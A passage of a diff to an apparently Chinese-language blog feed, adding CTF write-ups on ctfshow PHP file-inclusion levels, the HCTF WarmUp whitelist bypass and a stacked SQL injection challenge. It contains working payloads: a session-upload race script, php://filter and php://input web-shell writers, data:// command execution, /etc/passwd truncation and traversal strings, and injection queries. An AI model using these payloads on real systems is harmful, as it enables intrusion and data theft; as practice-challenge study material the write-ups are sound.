class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(f<span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> not in response.text:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(response.text)</span><br><span class="line">            sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>改下url和要执行的shell即可</p>
+<p><strong>参考文章:</strong></p>
+<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
+<p><a href="https://blog.csdn.net/qq_44657899/article/details/109281343">https://blog.csdn.net/qq_44657899/article/details/109281343</a></p>
+<p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
+<h2 id="web83"><a class="header-anchor" href="#web83">¶</a>web83</h2>
+<p><strong>源码:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 14</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:28:52</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"></span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>warning提示了  ，所以表单构造需要重新构造，多了 <code>session_start();</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;668ba926-9165-49e7-92fb-c94a08d54feb.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;2333&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>web82-86用py脚本都能跑过</strong></p>
+<h2 id="web84"><a class="header-anchor" href="#web84">¶</a>web84</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:40:01</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf &#x2F;tmp&#x2F;*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web85"><a class="header-anchor" href="#web85">¶</a>web85</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:59:51</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    if(file_exists($file))&#123;</span><br><span class="line">        $content &#x3D; file_get_contents($file);</span><br><span class="line">        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">            die(&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web86"><a class="header-anchor" href="#web86">¶</a>web86</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 21:20:43</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">define(&#39;还要秀？&#39;, dirname(__FILE__));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web87"><a class="header-anchor" href="#web87">¶</a>web87</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析源码，这题有两个传参，file和 content，然后将content参数的值写入到file参数所定义的文件里，但是一同写入的还有，在开头增加了die的过程，导致即使我们成功写入一句话，也执行不了，我们所要做的就是绕过die</p>
+<p>这里放上p神的 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_1">谈一谈php://filter的妙用</a></p>
+<p>p神文章已经讲得很清楚了，base64算法解码时是4个byte一组, 而phpdie共6个字符，所以我们解码的时候需要再添加两个字符</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php(file的内容需要进行两次url编码)</span><br><span class="line"></span><br><span class="line">content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p>写入一句话后，然后访问 1.php，就可以执行shell了</p>
+<p><a href="https://imgchr.com/i/sC1NvD"><img src="https://s3.ax1x.com/2021/01/03/sC1NvD.png" alt="sC1NvD.png"></a></p>
+<h2 id="web88"><a class="header-anchor" href="#web88">¶</a>web88</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-17 02:27:25</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    if(preg_match(&quot;&#x2F;php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\&#x3D;|\.&#x2F;i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>data协议绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4</span><br><span class="line"></span><br><span class="line">即 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,</span><br></pre></td></tr></table></figure>
+<h2 id="其他包含小姿势"><a class="header-anchor" href="#其他包含小姿势">¶</a>其他包含小姿势</h2>
+<p>审计中可见这样的包含模版文件：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;inc/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.htm&quot;</span>); <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<ol>
+<li>%00截断<br>
+/etc/passwd%00<br>
+(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li>
+<li>%00截断目录遍历：<br>
+/var/www/%00<br>
+(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li>
+<li>路径长度截断：<br>
+/etc/passwd/././././././.[…]/./././././.<br>
+(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li>
+<li>点号截断：<br>
+/boot.ini/………[…]…………<br>
+(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li>
+</ol>
+<h3 id="php-input"><a class="header-anchor" href="#php-input">¶</a>php://input</h3>
+<p>php://input协议主要用于访问各个输入/输出流。CTF中经常使用<code>file_get_contents</code>获取php://input内容(POST)，需要开启allow_url_include，并且当<code>enctype=&quot;multipart/form-data&quot;</code>的时候 php://input是无效的。</p>
+<p><strong>利用方式：<code>?file=php://input 数据利用POST传过去</code></strong></p>
+<blockquote>
+<p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。</p>
+</blockquote>
+<p>假设页面源代码为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if (@file_get_content($file) &#x3D;&#x3D; &#39;meizijiu&#39;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>直接使用Hackbar工具POST数据：</p>
+<p><a href="https://imgchr.com/i/sC1DUI"><img src="https://s3.ax1x.com/2021/01/03/sC1DUI.png" alt="sC1DUI.png"></a></p>
+<p>另外还可以写入一句话</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">post数据:</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4&#x3D;&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>参考</strong>:<a href="https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://ca0y1h.top/Web_security/basic_learning/13.文件包含漏洞利用/</a></p>
+<p><a href="https://www.cnblogs.com/NPFS/p/13797449.html">https://www.cnblogs.com/NPFS/p/13797449.html</a></p>
+]]></content>
+      <categories>
+        <category>刷题站</category>
+        <category>ctfshow</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ctfshow入门之文件上传</title>
     <url>/2021/01/15/ctfshow%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
@@ -735,6 +588,214 @@ payload: cat flag.php||</p>
       <categories>
         <category>刷题站</category>
         <category>ctfshow</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>buuctf之web</title>
+    <url>/2021/01/12/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>buuctf之web刷题记录</p>
+<a id="more"></a>
+<h1>[HCTF 2018]WarmUp</h1>
+<p>要不是我脸皮厚 第一题就能把我劝退 🙂</p>
+<p>右键源代码得到提示</p>
+<p>访问source.php 得到源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>先根据提示的 hint.php 得到信息</p>
+<p><code>flag not here, and flag in ffffllllaaaagggg</code></p>
+<p>看看几个需要知道的函数</p>
+<p>1.mb_substr()</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114212509625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>2.mb_strpos</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114212747465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>先分析 emmm这个类</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class emmm</span><br><span class="line">&#123;</span><br><span class="line">    public static function checkFile(&amp;$page)</span><br><span class="line">    &#123;</span><br><span class="line">        $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">        if (! isset($page) || !is_string($page)) &#123;  &#x2F;&#x2F;page必须不为空或为字符串</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) &#123;  &#x2F;&#x2F;in_array()检测page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page &#x3D; mb_substr(  &#x2F;&#x2F;如果page含有?，则获取page第一个?前的值并赋给_page变量</span><br><span class="line">            $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;  &#x2F;&#x2F;检测_page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page &#x3D; urldecode($page);  &#x2F;&#x2F;给_page二次赋值，使其等于URL解码之后的page</span><br><span class="line">        $_page &#x3D; mb_substr(&#x2F;&#x2F;得到hint(source).php</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)  &#x2F;&#x2F;如果_page有?，则截取_page(URL解码后的page)两个?中间的值</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;  &#x2F;&#x2F;检测_page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到函数代码中有四个if语句：</p>
+<p><em><strong>第一个if语句</strong></em> 对变量进行检验，要求$page为字符串，否则返回false <em>//因为返回False所以这里无用</em><br>
+<em><strong>第二个if语句</strong></em> 判断$page是否存在于$whitelist数组中，存在则返回true<br>
+<em><strong>第三个if语句</strong></em> 判断截取后的$page是否存在于$whitelist数组中，截取$page中’?'前部分，存在则返回true<br>
+<em><strong>第四个if语句</strong></em> 判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br>
+若以上四个if语句均未返回值，则返回false</p>
+<p>有三个if语句可以返回true，第二个语句直接判断$page，不可用</p>
+<p>第三个语句截取’?'前部分，由于?被后部分被解析为get方式提交的参数，也不可利用</p>
+<p>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?'，仍可通过第四个if语句校验。</p>
+<p><strong>只要这四个if语句有一个为true即可包含file</strong>，关键点在_page 经过截断后返回true.</p>
+<p>所以我们的突破点就在于第四个if语句中，只要满足他的条件，我们就可以包含文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_page &#x3D; urldecode($page); </span><br><span class="line">$_page &#x3D; mb_substr(</span><br><span class="line">　　$_page,</span><br><span class="line">　　0,</span><br><span class="line">　　mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) &#x2F;&#x2F;得到hint(source).php的最后位置</span><br><span class="line">);if (in_array($_page, $whitelist)) &#123; </span><br><span class="line">　　return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里URL解码了一次$page值，这里需要注意的是，<em><strong>PHP中$_GET、$_POST、$_REQUEST这类函数在提取参数值时会URL解码一次</strong></em></p>
+<p>而这里在代码中又一次URL解码了一次，共计解码了两次，所以我们也需要对传入的值进行两次URL编码</p>
+<p>其次我们的突破点就在于这段代码只会截取?之前的字符串拿去和whitelist比对，因此只要确保?前的值是source.php或hint.php即可返回true</p>
+<p>等同于 /source.php?file=source.php%253Fxxxx 便可以使用include()函数包含 source.php?xxxx 这个文件(%253f是?URL编码两次后的值)</p>
+<p>所以可以构造Payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?file&#x3D;source.php%253F&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，这里之所以可以包含到ffffllllaaaagggg是因为PHP将 source.php%253F/ 视作了一个文件夹，然后 …/ 的用途是返回上级目录</p>
+<p>ffffllllaaaagggg位于根目录下，一般Web服务的文件夹在/var/www/html目录中，再加上source.php?/这个“文件夹”，所以我们总共需要…/四次来返回到根目录  当然你也可以用…/更多次 毕竟是在根目录</p>
+<p>参考:<a href="https://www.cnblogs.com/yesec/p/12635274.html">https://www.cnblogs.com/yesec/p/12635274.html</a></p>
+<h1>[强网杯 2019]随便注</h1>
+<p>单引号试探</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114141920393.png" alt="在这里插入图片描述"></p>
+<p>然后 1’# 成功回显，发现并没有过滤注释符</p>
+<p><code>1'order by 2#</code>检测发现两个字段</p>
+<p>使用联合注入的时候发现大部分的注入方法都被过滤了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114141947895.png" alt="在这里插入图片描述"></p>
+<p>用sqlmap跑了一下得到库名: supersqli</p>
+<p>后面发现可以使用堆叠注入</p>
+<p>查出表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show tables from supersqli;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210114142009224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查字段名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from words;#</span><br></pre></td></tr></table></figure>
+<p>这个表好像没什么可以用的信息,有两个字段  id和data</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
+<p>注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
+<p>eg.  mysql&gt; SELECT * FROM   <code>table</code>   WHERE  <code>id</code> = ‘123’ ;</p>
